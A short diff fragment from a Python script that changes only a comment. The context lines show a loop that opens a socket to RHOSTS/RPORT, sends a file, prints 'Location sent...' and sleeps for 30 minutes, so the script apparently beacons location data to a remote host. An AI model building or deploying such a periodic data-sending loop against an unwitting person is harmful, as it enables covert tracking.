@@ -34,7 +34,7 @@ while True:
         s.connect((RHOSTS, RPORT))
         s.send(sendFile)
         print("Location sent...")
-        time.sleep(1800)
+        time.sleep(1800) # Change this too
 
 # Start the loop over
     continue
